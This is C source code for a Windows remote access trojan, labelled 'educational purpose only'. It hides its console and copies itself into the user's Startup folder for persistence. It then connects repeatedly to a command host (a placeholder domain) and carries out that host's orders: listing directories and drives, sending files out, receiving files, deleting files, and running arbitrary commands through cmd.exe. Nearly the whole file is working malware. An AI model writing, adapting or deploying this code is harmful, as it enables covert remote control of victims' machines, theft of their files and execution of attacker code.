/*
* Created By: EH
* -----------------------
* Educational purpose only             
* I'm not responsible for your actions 
*/

#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <unistd.h>
#include <tchar.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFSIZE MAX_PATH
#define BUFF_LEN 9000

WSADATA data;
WORD    ver;
SOCKET  sock;
SOCKADDR_IN  hint;


char err[7] = "error\n";
char disk[100];


int wsa_soc_con( char* IP, int port )
{
    ver = MAKEWORD(2, 2);
    int wsResult = WSAStartup(ver, &data);
    sock = socket(AF_INET, SOCK_STREAM, 0);
        
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    hint.sin_addr.s_addr = inet_addr(IP);

    int conResult = connect(sock, (SOCKADDR*)&hint, sizeof(hint));
    
    if ( conResult == SOCKET_ERROR ) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    return 0;
}


int check_path( char* path ) {
    WIN32_FIND_DATA fdfile;
    HANDLE hfind = NULL;

    char newpath[2049];
    sprintf(newpath, "%s\\*.*", path);

    if ( (hfind = FindFirstFile(newpath, &fdfile)) == INVALID_HANDLE_VALUE ) {
        return 1;
    }

    FindClose(hfind);
    
    return 0;
}

void get_disk() {

    char* letters[26] = {
        "A:", "B:", "C:", "D:", "E:", 
        "F:", "G:", "H:", "I:", "J:", 
        "K:", "L:", "M:", "N:", "O:", 
        "P:", "Q:", "R:", "S:", "T:", 
        "U:", "V:", "W:", "X:", "Y:",
        "Z:",
    };

    int count = 0;

    for ( int i = 0; i < 26; i++ ) {
        if ( check_path(letters[i]) == 0 ) {
            disk[count] = 64+i+1;
            count++;
            disk[count] = '\n';
            count++;
        }
    }
}


int to_startup( char* path, char* filename, char* out_name ) {
    FILE* fptr;
    FILE* fptw;

    char buffer[1];
    if ( (fptr = fopen(filename, "rb")) == 0 ) {
        return 1;
    }

    if ( (fptw = fopen(out_name, "wb")) == 0 ) {
        return 1;
    }

    while ( fread(buffer, sizeof(buffer), 1, fptr) ) {
        fwrite(buffer, sizeof(buffer), 1, fptw);
    }

    fclose(fptr);
    fclose(fptw);

    return 0;
}


int is_file_exist( char* name ) {
    FILE* fptr;

    if ( (fptr = fopen(name, "rb")) == NULL ) {
        return 1;
    }
    fclose(fptr);

    return 0;
}


int download_file( SOCKET sock ) {
    FILE* fptr; 
    char name[BUFF_LEN];
    int bytesRecvd;

    bytesRecvd = recv(sock, name, sizeof(name), 0);
    if ( bytesRecvd <= 0 ) 
    {
        return 1;
    }

    if( (fptr = fopen(name, "ab")) == NULL )
    {
        return 1;
    }
    
    char buffer[1];
    
    while ( (bytesRecvd = recv(sock, buffer, sizeof(buffer), 0)) > 0 ) {        
        fwrite(buffer, sizeof(buffer), 1, fptr);
        memset(buffer, 0, sizeof(buffer));
    }
    
    fclose(fptr);

    return 0;
}


int upload_file( char* filename, SOCKET sock ) {
    FILE* fptr; 
    char buffer[1];
    
    memset(buffer, 0, sizeof(buffer));

    if( (fptr = fopen(filename, "rb")) == NULL )
    {
        return 1;
    }

    send(sock, filename, strlen(filename) + 1, 0);
    Sleep(5000); 
    while ( fread(buffer, sizeof(buffer), 1, fptr) > 0 ) {
        send(sock, buffer, sizeof(buffer), 0);
    }

    fclose(fptr);

    return 0;
}


int ls_dir( SOCKET sock ) {
    char store_one[1000];
    char buffrecv[1000];
    int sendRes;
    int byteRecvd;

    WIN32_FIND_DATA fdfile;
    HANDLE hfind;
    TCHAR Buffer[BUFSIZE];
    DWORD dwRet;
    
    dwRet = GetCurrentDirectory(BUFSIZE, Buffer);
    if( dwRet == 0 )
    {
        return 1;
    }

    char newpath[2048];
    sprintf(newpath, "%s\\*.*", Buffer);
    
    if ( (hfind = FindFirstFile(newpath, &fdfile)) == INVALID_HANDLE_VALUE ) {
        return 1;
    }

    do
    {
        if ( strcmp(fdfile.cFileName, ".") != 0 && strcmp(fdfile.cFileName, "..") != 0 ) {
            sprintf(store_one, "%s\n", fdfile.cFileName);
            sendRes = send(sock, store_one, sizeof(store_one), 0);
            
            if (sendRes == SOCKET_ERROR) {
                return 1;
            }

            if ((byteRecvd = recv(sock, buffrecv, sizeof(buffrecv), 0)) > 0 && buffrecv == "done");
        }

    } while ( FindNextFile(hfind, &fdfile) );
    
    FindClose(hfind);

    return 0;
}


int pwd( SOCKET sock ) {
    TCHAR Buffer[BUFSIZE];
    DWORD dwRet;
    char msg[BUFF_LEN];
    memset(Buffer, 0, sizeof(Buffer));
    memset(msg, 0, sizeof(msg));

    dwRet = GetCurrentDirectory(BUFSIZE, Buffer);
    if( dwRet == 0 )
    {
        return 1;
    }

    sprintf(msg, "\n[*]Current Directory: %s\n", Buffer);

    send(sock, msg, sizeof(msg), 0);

    return 0;
}


int first_word( char* found, char* command ) {
    int size = strlen(found);

    if ( size >= strlen(command) ) {
        for ( int i = 0; i < size; i++ ) {
            if ( found[i] == ' ' && command[i] == ' ' || found[i] == ' ' && command[i] == '\0'
            || found[i] == '\n' && command[i] == '\0' ) 
            {
                return 0;
            }
            else if ( found[i] != command[i] ) {
                return 1;
            }
        }   
    }
    else {
        return 1;
    }

    return 0;
}


void ClientSoc( char* IP , int port ) {
    char buffrecv[BUFF_LEN];
    char out_msg[BUFF_LEN];
    int count = 0;
    int code = 0;
    int i;
    

    while (1) {
        Sleep(30000);

        if ( wsa_soc_con(IP, port) != 0 ) {
            continue;
        }
        
        while (1) {

            if ( code != 0 ) 
            {
                send(sock, err, sizeof(err), 0);
            }

            memset(buffrecv, 0, sizeof(buffrecv));
            memset(out_msg, 0, sizeof(out_msg));
            code  = 0;
            count = 0;
            int bytesRecived = recv(sock, buffrecv, sizeof(buffrecv), 0);

            if ( bytesRecived <= 0 ) {
                closesocket(sock);
                WSACleanup();
                break;
            }
            if ( first_word(buffrecv, "cd") == 0 ) {
                for ( i = 3; buffrecv[i] != '\0'; i++ ){
                    out_msg[count] = buffrecv[i];
                    count++;
                }
                out_msg[count-1] = '\0';

                if( !SetCurrentDirectory(out_msg) )
                {
                    send(sock, err, sizeof(err), 0);
                } 
                else 
                {
                    send(sock, "[*]Changed Directory", sizeof("[*]Changed Directory"), 0);
                }

            } 
            else if ( strcmp(buffrecv, "dir\n") == 0 || strcmp(buffrecv, "ls\n") == 0 ) {
                code = ls_dir(sock);
                closesocket(sock);
                WSACleanup();
                wsa_soc_con(IP, port);
                continue;
            }
            else if ( first_word(buffrecv, "download_file") == 0 ) {
                for ( i = 14; buffrecv[i] != '\0'; i++ )
                {
                    out_msg[count] = buffrecv[i];
                    count++;
                }
                out_msg[count-1] = '\0';

                if ( is_file_exist(out_msg) == 0 ) {
                    upload_file(out_msg, sock);
                    closesocket(sock);
                }
                else
                {
                    closesocket(sock);
                }
                WSACleanup();
                wsa_soc_con(IP, port);
            }
            else if ( first_word(buffrecv, "upload_file") == 0 ) {
                code = download_file(sock);
                
                WSACleanup();
                wsa_soc_con(IP, port);
            }
            else if ( first_word(buffrecv, "del") == 0 ) {
                for ( i = 4; buffrecv[i] != '\0'; i++ )
                {
                    out_msg[count] = buffrecv[i];
                    count++;
                }
                out_msg[count-1] = '\0';

                code = DeleteFile(out_msg);

                
                if ( code != 0 ) 
                {
                    send(sock, "[*]file deleted", sizeof("[*]file deleted"), 0);
                }
                else
                {
                    send(sock, err, sizeof(err), 0);
                }
            }
            else if ( first_word(buffrecv, "run") == 0 ) {
                for ( i = 4; buffrecv[i] != '\0'; i++ )
                {
                    out_msg[count] = buffrecv[i];
                    count++;
                }
                out_msg[count-1] = '\0';

                char temp[900];
                sprintf(temp, "/C %s", out_msg);

                if ( is_file_exist(out_msg) == 1 ) {
                    send(sock, err, sizeof(err), 0);
                }
                
                ShellExecute(0, "open", "cmd.exe", temp, 0, SW_NORMAL);
                send(sock, "[*]Executed", sizeof("[*]Executed"), 0);
                
            }
            else if ( strcmp(buffrecv, "pwd\n") == 0 ) {
                pwd(sock);
            }
            else if ( strcmp(buffrecv, "ls_disk\n") == 0 ) {
                send(sock, disk, sizeof(disk), 0);
            }
            else if ( strcmp(buffrecv, "exit_client\n") == 0 ) {
                exit(1);
            }
            else
            {
                send(sock, "unknown command\n", sizeof("unknown command\n"), 0);
            }
        }
    }
}


int main( int argc, char* argv[] ) {
    FreeConsole();
    get_disk();

    WSADATA wsaData;
    DWORD dwError;
    struct hostent *remoteHost;
    char *host_name;
    struct in_addr addr;

    char temp_name[300];
    char current_exe[300];
    char path_name[900];
    char* path = getenv("USERPROFILE");
    int count = 0;
    int iResult;
    int i = 0;
    
    
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if ( iResult != 0 ) {
        return 1;
    }

    host_name = "example.io";
    remoteHost = gethostbyname(host_name);
    
    if ( remoteHost == NULL ) {
        dwError = WSAGetLastError();
        if ( dwError != 0 ) {
            if ( dwError == WSAHOST_NOT_FOUND ) {
                return 1;
            } else if ( dwError == WSANO_DATA ) {
                return 1;
            } else {
                return 1;
            }
        }
    } else {
        if ( remoteHost->h_addrtype == AF_INET )
        {
            while ( remoteHost->h_addr_list[i] != 0 ) {
                addr.s_addr = *(u_long *) remoteHost->h_addr_list[i++];
            }

        }
        else if ( remoteHost->h_addrtype == AF_NETBIOS )
        {   
            return 1;
        }   
    }

    char* IP = inet_ntoa(addr);
    int PORT = 0000;

    sprintf(path_name, "%s%s",  path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
    

    if ( check_path(path_name) == 0 ) {
        memset(current_exe, 0, sizeof(current_exe));
        memset(temp_name, 0, sizeof(temp_name));
        memset(path_name, 0, sizeof(path_name));
        
        for ( i = strlen(argv[0]) - 1; i != 0; i-- ) {
            if (argv[0][i] == '\\') {
                break;
            }
            temp_name[count] = argv[0][i];
            count++;
        }
        count = 0;
        
        for ( i = strlen(temp_name) - 1; i != -1; i-- ) {
            current_exe[count] = temp_name[i]; 
            count++;
        }
        
        sprintf(path_name, "%s%s%s",  path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", current_exe);
        
        if ( is_file_exist(path_name) != 0 ) {
            to_startup(path, argv[0], path_name);
        }
    }

    
    ClientSoc(IP, PORT);
    
    return 0;
}
